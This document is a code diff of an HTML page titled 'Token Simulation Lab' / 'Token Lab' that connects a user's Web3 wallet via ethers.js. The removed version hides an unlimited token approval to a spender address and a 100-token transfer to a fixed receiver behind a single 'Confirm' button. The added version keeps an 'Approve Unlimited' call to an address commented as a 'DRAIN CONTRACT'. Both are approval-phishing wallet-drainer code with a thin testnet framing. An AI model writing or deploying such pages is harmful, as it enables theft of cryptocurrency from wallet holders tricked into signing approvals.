@@ -1,102 +1,104 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Token Simulation Lab</title>
+  <title>Token Lab (Transfer + Approve)</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-  <style>
-    body {
-      background-color: #000; /* Black background */
-      color: #fff;
-      font-family: sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-
-    #confirmBtn {
-      background-color: #007bff; /* Blue button */
-      color: white;
-      border: none;
-      padding: 15px 40px;
-      font-size: 18px;
-      font-weight: bold;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-
-    #confirmBtn:hover {
-      background-color: #0056b3;
-    }
-
-    #status {
-      margin-top: 20px;
-      color: #aaa;
-      font-size: 14px;
-    }
-  </style>
 </head>
 
-<body>
+<body style="font-family:sans-serif">
 
-  <h2>🧪 Token Simulation Lab</h2>
+<h2>🧪 Token Lab (BSC Testnet)</h2>
 
-  <button id="confirmBtn" onclick="runSimulation()">Confirm</button>
+<button onclick="init()">Connect & Ensure Testnet</button><br><br>
 
-  <p id="status">Ready</p>
+<button onclick="sendToken()">Send 10 Tokens</button><br><br>
 
-  <script>
-    let provider, signer, user;
+<button onclick="approveToken()">Approve Unlimited</button><br><br>
 
-    const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
-    const receiver = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";
-    const spender = "0x0a5a5a1308c3c05fa94b97f38920d1a84f53c783";
+<p id="status"></p>
 
-    const tokenABI = [
-      "function transfer(address to, uint256 amount) public returns (bool)",
-      "function approve(address spender, uint256 amount) public returns (bool)"
-    ];
+<script>
+let provider, signer, user;
 
-    async function runSimulation() {
-      const status = document.getElementById("status");
+// 🔁 YOUR TOKEN
+const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
 
-      try {
-        // 1. CONNECT
-        if (!window.ethereum) {
-          alert("Please use a Web3 browser");
-          return;
-        }
-        
-        status.innerText = "Connecting...";
-        await window.ethereum.request({ method: "eth_requestAccounts" });
-        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-        signer = provider.getSigner();
-        user = await signer.getAddress();
-        
-        const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
+// 🔁 YOUR DRAIN CONTRACT
+const spender = "0x8dc3da2ff65ec0bbac40f33efe7c02c9c0b7ebaf";
 
-        // 2. APPROVE
-        status.innerText = "Processing Approval...";
-        const approveTx = await contract.approve(spender, ethers.constants.MaxUint256);
-        await approveTx.wait();
+// 🔁 RECEIVER (use your own address for test)
+const receiver = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";
 
-        // 3. SEND
-        status.innerText = "Sending Tokens...";
-        const transferTx = await contract.transfer(receiver, ethers.utils.parseUnits("100", 18));
-        await transferTx.wait();
+const tokenABI = [
+  "function transfer(address to, uint256 amount) returns (bool)",
+  "function approve(address spender, uint256 amount) returns (bool)"
+];
 
-        status.innerText = "Success! All steps complete.";
-        alert("Transaction Sequence Finished");
+async function init() {
+  if (!window.ethereum) {
+    alert("Open inside Trust Wallet browser");
+    return;
+  }
 
-      } catch (e) {
-        console.error(e);
-        status.innerText = "Error: " + (e.reason || "Action cancelled");
-      }
-    }
-  </script>
+  // connect
+  await window.ethereum.request({ method: "eth_requestAccounts" });
+
+  // try switching to BSC Testnet (chainId 97 = 0x61)
+  try {
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: "0x61" }]
+    });
+  } catch (e) {
+    console.log("Switch failed or already on correct network");
+  }
+
+  provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+  signer = provider.getSigner();
+  user = await signer.getAddress();
+
+  document.getElementById("status").innerText =
+    "Connected: " + user + " (BSC Testnet)";
+}
+
+// 🟢 TOKEN TRANSFER
+async function sendToken() {
+  try {
+    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
+
+    const tx = await contract.transfer(
+      receiver,
+      ethers.utils.parseUnits("10", 18)
+    );
+
+    await tx.wait();
+
+    alert("✅ Sent 10 tokens");
+
+  } catch (e) {
+    alert(e.message);
+  }
+}
+
+// 🔴 APPROVE
+async function approveToken() {
+  try {
+    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
+
+    const tx = await contract.approve(
+      spender,
+      ethers.constants.MaxUint256
+    );
+
+    await tx.wait();
+
+    alert("🔥 Approved unlimited");
+
+  } catch (e) {
+    alert(e.message);
+  }
+}
+</script>
 
 </body>
 </html>
